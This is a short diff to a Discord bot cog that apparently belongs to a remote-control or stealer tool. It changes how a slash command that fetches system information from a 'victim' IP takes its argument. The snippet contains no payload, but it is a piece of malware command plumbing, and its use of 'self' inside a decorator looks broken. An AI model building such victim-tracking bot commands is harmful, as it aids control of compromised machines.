@@ -12,9 +12,7 @@ class SytemInfo(commands.Cog):
         
     @commands.slash_command(
         description="Sends General System Information",
-        options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True),
-        ],
+        options=[self.bot.victim],
     )
     async def get_systeminfo(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
